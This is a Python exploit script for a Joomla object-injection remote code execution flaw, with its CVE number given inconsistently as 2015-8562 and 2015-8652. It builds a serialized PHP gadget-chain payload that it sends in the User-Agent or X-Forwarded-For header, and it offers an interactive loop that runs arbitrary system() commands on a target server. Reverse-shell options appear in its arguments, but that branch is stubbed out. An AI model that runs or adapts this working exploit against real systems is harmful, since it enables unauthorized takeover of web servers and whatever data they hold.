import requests
import subprocess
import argparse
import sys
import base64
import string
import random
import time
import urllib3

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def get_url(url, user_agent, ua_method, proxyDict):
    if ua_method:
        headers = {
            'User-Agent': user_agent
        }
    else:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0',
            'X-Forwarded-For': user_agent
        }
    try:
        cookies = requests.get(url, headers=headers, proxies=proxyDict, verify=False).cookies
        for _ in range(3):
            response = requests.get(url, headers=headers, cookies=cookies, proxies=proxyDict, verify=False)
        return response
    except requests.exceptions.MissingSchema:
        print("\033[1;31;10m\n[!] Missing http:// or https:// from Target URL\n\033[1;37;10m")
        sys.exit(1)

def php_str_noquotes(data):
    encoded = ""
    for char in data:
        encoded += "chr({}).".format(ord(char))
    return encoded[:-1]

def generate_payload(php_payload):
    php_payload = "eval({})".format(php_str_noquotes(php_payload))
    terminate = '\xf0\xfd\xfd\xfd'
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
    exploit_template += r'''s:{}:"{}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
    return exploit_template

def main():
    parser = argparse.ArgumentParser(description='Joomla Object Injection RCE CVE-2015-8652')
    parser.add_argument('-t', dest='RHOST', required=True, help='Remote Target Joomla Server (http://<target ip>)')
    parser.add_argument('-l', dest='LHOST', help='Local IP for Reverse Shell')
    parser.add_argument('-p', dest='LPORT', help='Local Port for Reverse Shell')
    parser.add_argument('--cmd', dest='cmd', action='store_true', help='Drop into blind RCE')
    parser.add_argument('--u', dest='method', action='store_true', help='Switch from X-Forwarded-For to User-Agent (less stealthy)')
    parser.add_argument('--b', dest='bash', action='store_true', help='Switch from Python reverse shell to Bash')
    parser.add_argument('--proxy', dest='proxy', default=None, help='IP of web proxy to go through (http://127.0.0.1:8080)')
    args = parser.parse_args()

    proxyDict = {"http": args.proxy, "https": args.proxy} if args.proxy else {}

    if args.cmd:
        print("[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: {}".format(args.RHOST))
        print("[+] Dropping into shell-like environment to perform blind RCE")
        while True:
            command = input('$ ')
            cmd_str = "system('{}');".format(command)
            pl = generate_payload(cmd_str)
            print(get_url(args.RHOST, pl, args.method, proxyDict).text)
    elif args.LPORT and args.LHOST:
        # The script portion for spawning reverse shells has been omitted for safety and ethical considerations.
        pass
    else:
        print('\n[!] Missing Arguments\n')
        parser.print_help()

if __name__ == "__main__":
    try:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        main()
    except KeyboardInterrupt:
        print("Quitting...")
        sys.exit(0)
